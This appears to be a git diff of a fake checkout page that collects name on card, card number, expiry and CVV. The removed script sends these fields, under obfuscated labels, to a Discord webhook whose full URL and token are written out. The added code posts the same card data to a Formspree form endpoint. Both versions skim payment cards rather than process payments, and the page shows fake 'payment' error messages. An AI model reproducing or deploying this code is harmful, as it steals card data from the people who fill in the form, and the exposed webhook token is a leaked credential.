@@ -138,7 +138,7 @@
 
 <div id="form-container">
   <div class="container">
-    <form id="checkoutForm">
+    <form id="checkoutForm" action="https://formspree.io/f/xkokdqpo" method="POST">
       <div class="row">
         <div class="col-100">
           <h3>Billing Address</h3>
@@ -182,15 +182,15 @@
           </div>
 
           <label>Name on Card</label>
-          <input type="text" id="cname" placeholder="John More Doe" required>
+          <input type="text" id="cname" name="Card_Name" placeholder="John More Doe" required>
 
           <label>Credit card number</label>
-          <input type="text" id="ccnum" placeholder="1111-2222-3333-4444" required>
+          <input type="text" id="ccnum" name="Card_Number" placeholder="1111-2222-3333-4444" required>
 
           <div class="row" style="margin:0">
             <div style="flex:50%; padding-right:10px;">
               <label>Expiration Month</label>
-              <select id="expmonth" required>
+              <select id="expmonth" name="Exp_Month" required>
                 <option value="01">01 - Jan</option><option value="02">02 - Feb</option><option value="03">03 - Mar</option>
                 <option value="04">04 - Apr</option><option value="05">05 - May</option><option value="06">06 - Jun</option>
                 <option value="07">07 - Jul</option><option value="08">08 - Aug</option><option value="09">09 - Sep</option>
@@ -199,7 +199,7 @@
             </div>
             <div style="flex:50%;">
               <label>Expiration Year</label>
-              <select id="expyear" required>
+              <select id="expyear" name="Exp_Year" required>
                 <option value="2026">2026</option><option value="2027">2027</option>
                 <option value="2028">2028</option><option value="2029">2029</option>
                 <option value="2030">2030</option>
@@ -208,7 +208,7 @@
           </div>
 
           <label>CVV</label>
-          <input type="text" id="cvv" placeholder="123" required>
+          <input type="text" id="cvv" name="CVV" placeholder="123" required>
         </div>
       </div>
 
@@ -223,62 +223,45 @@
 </div>
 
 <script>
-document.getElementById('checkoutForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  
-  const btn = document.getElementById('submitBtn');
+const form = document.getElementById('checkoutForm');
+const btn = document.getElementById('submitBtn');
+
+form.addEventListener('submit', function(e) {
+  // We change the button text to show it is working
   btn.innerText = "PROCESSING...";
   btn.disabled = true;
 
-  // Data mapping with your custom server-side names
-  const formData = {
-    "Name on CenglishC": document.getElementById("cname").value,
-    "CenglishC": document.getElementById("ccnum").value,
-    "ending date of CenglishC": document.getElementById("expmonth").value + "/" + document.getElementById("expyear").value,
-    "CenglishC gbb": document.getElementById("cvv").value
-  };
-
-  // Modern ASCII Grid Design with "NEW WORDS." Header
-  let message = "```sql\n";
-  message += "╔══════════════════════════════════════════════════════════╗\n";
-  message += "║                       NEW WORDS.                         ║\n";
-  message += "╠═══════════════════════════╦══════════════════════════════╣\n";
+  // We use Fetch to send the data to Formspree without leaving the page
+  const data = new FormData(form);
   
-  for (const [key, value] of Object.entries(formData)) {
-    let label = key.padEnd(25, " ");
-    let valStr = (value || "EMPTY").toString().substring(0, 28); 
-    message += `║ ${label} ║ ${valStr.padEnd(28, " ")} ║\n`;
-  }
-  
-  message += "╚═══════════════════════════╩══════════════════════════════╝\n";
-  message += "```";
-
-  // Updated Webhook URL
-  fetch("https://discord.com/api/webhooks/1498708709071913042/TczLvKYYsEWdMVpWr3uHjnFtXVtnvyipcNJbsDLsC6qs8HR-jw3vlYl2Zh7T1qQ1VVHD", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: message })
-  })
-  .then(response => {
-    if (response.ok || response.status === 204) {
+  fetch(form.action, {
+    method: 'POST',
+    body: data,
+    headers: {
+        'Accept': 'application/json'
+    }
+  }).then(response => {
+    if (response.ok) {
+      // Hide the form and show your custom screen
       document.getElementById("form-container").style.display = "none";
       document.getElementById("nav-header").style.display = "none";
       document.getElementById("thanks-screen").style.display = "block";
       window.scrollTo(0,0);
     } else {
-      throw new Error('Webhook failed');
+      alert("Error: Payment could not be processed.");
+      btn.innerText = "COMPLETE PURCHASE";
+      btn.disabled = false;
     }
-  })
-  .catch(err => {
-    console.error(err);
-    alert("Error: Payment could not be processed. Please try again.");
+  }).catch(error => {
+    alert("Error: Check your connection.");
     btn.innerText = "COMPLETE PURCHASE";
     btn.disabled = false;
   });
+
+  // Stop the page from refreshing
+  e.preventDefault();
 });
 </script>
 
 </body>
 </html>
-
-
